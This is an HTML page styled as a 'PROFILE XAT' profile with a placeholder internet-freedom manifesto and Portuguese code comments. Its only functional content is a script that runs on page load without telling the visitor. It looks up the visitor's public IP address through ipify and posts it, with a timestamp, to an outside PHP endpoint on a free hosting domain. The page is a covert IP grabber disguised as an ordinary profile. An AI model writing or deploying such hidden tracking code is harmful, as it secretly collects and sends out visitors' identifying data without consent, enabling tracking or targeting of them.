<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile</title>
    <style>
        /* Estilos CSS */
    </style>
</head>
<body>
    <div class="banner">
        <h1>PROFILE XAT</h1>
    </div>
    <div class="manifesto">
        <!-- Manifesto sobre liberdade na internet -->
    </div>

    <script>
        // Função para obter o endereço IP do cliente e enviar para o servidor externo
        function sendIPToServer() {
            fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                var time = new Date().toLocaleString();
                var location = ""; // Infelizmente, a API não fornece localização precisa

                var requestData = {
                    ip: ip,
                    time: time,
                    location: location
                };

                fetch('https://leanbnk.000webhostapp.com/endpoint.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(requestData),
                })
                .then(response => response.text())
                .then(data => {
                    console.log(data); // Exibe a resposta do servidor no console
                })
                .catch((error) => {
                    console.error('Erro ao enviar os dados:', error);
                });
            })
            .catch((error) => {
                console.error('Erro ao obter o endereço IP:', error);
            });
        }

        // Chama a função para enviar o endereço IP ao carregar a página
        sendIPToServer();
    </script>
</body>
</html>
